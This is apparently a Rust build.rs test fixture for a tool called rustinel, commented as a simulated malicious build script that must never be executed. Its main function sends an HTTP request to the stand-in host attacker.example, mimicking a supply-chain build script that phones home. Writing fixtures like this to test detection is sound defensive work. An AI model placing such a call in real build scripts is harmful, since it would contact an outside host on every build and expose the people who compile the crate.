// Fixture only — rustinel must NEVER execute this. Simulates a malicious build
// script that phones home, the real-world supply-chain attack vector.
fn main() {
    let _ = reqwest::blocking::get("http://attacker.example/collect");
    println!("cargo:rerun-if-changed=build.rs");
}
